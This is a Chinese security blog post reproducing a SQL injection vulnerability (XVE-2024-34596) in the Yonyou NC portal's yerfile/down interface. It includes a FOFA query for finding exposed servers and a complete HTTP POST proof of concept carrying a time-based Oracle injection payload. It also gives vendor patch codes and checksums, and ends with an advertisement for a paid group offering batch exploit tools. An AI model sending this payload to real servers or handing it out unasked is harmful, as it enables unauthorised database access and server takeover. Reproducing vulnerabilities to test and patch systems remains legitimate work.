#  「漏洞复现」用友NC yerfile/down SQL注入漏洞(XVE-2024-34596)   
冷漠安全  冷漠安全   2024-12-05 21:28  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
用友NC（也称用友NC6或NCC）是用友网络科技股份有限公司开发的一款企业级管理软件，旨在为企业提供全方位的管理服务。主要面向大型企业和集团公司，提供全面的财务和业务管理解决方案，助力企业实现数字化转型和高效管理。采用J2EE架构和先进开放的集团级开发平台UAP，融合了云计算技术、移动应用技术等最新互联网技术，形成了集团管控8大领域15大行业68个细分行业的解决方案。凭借其全面的功能、强大的集成能力和高度的可定制化，成为许多大型企业和集团公司进行财务和业务管理的首选工具。  
  
0x03  
  
漏洞威胁  
  
用友NC portal/pt/yerfile/down 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。  
  
影响范围：  
  
NC63、NC633、NC65  
  
0x04  
  
漏洞环境  
  
FOFA:  
```
app="用友-UFIDA-NC"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pVBqibpu97dQCJsVtx40ibpIR6ictdP63N4O1OVCYq33icSibGPqgeKumtIyg3pibtommibfHhsQ1picxaSg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: close

id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),4)--
```  
  
PS：数据库分为mssql和oracle 自行调整payload   
  
延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pVBqibpu97dQCJsVtx40ibpIf7ia1fqdp4scSAVFRzeN5DAQ4ESkjL9jW9ttKpWP3bWvpIQvzo3sg5A/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pVBqibpu97dQCJsVtx40ibpI4sjjT3rGGiaNhibOiccGvtIe4wyk7vTic0Ivakic72A0Ityuzdib8jCf6iaZA/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
打对应补丁，重启服务，各版本补丁获取方式如下：  
  
NC63方案  
  
补丁名称：patch_63-网报-附件下载SQL注入问题处理  
  
补丁编码：NCM_NC6.3_000_109902_20240522_GP_371181203  
  
校验码：  
  
c1cac33f9f57dce91da1cdb47a72f11884f3ad9920a07aee4ffffb2e647e5250  
  
NC633方案  
  
补丁名称：patch_633-网报-附件下载SQL注入问题处理  
  
补丁编码：NCM_NC6.33_000_109902_20240522_GP_371301857  
  
校验码：  
  
cfe23eda55de7e874adacc0b7722144a80cba7b2ae778f7d77ce9cc60f16481e  
  
NC65方案  
  
补丁名称：patch_65-网报-附件下载SQL注入问题处理  
  
补丁编码：NCM_NC6.5_000_109902_20240522_GP_371338574  
  
校验码：  
  
f3b01ab8e65cab2c29df3dee4143afc1432819733d5142a971e50fc7928ba432  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pVBqibpu97dQCJsVtx40ibpIZ172VWSwksEib5k56bVokXb1KbaaMm6Cvrkr14RFENJfMmLsRRDWG2Q/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pVBqibpu97dQCJsVtx40ibpIrZOZaMY3cD1DE1JpzRQMh6AKd4YMA9lVcesiazZ1dJrnehrjtF3vH0A/640?wx_fmt=gif&from=appmsg "")  
  
  
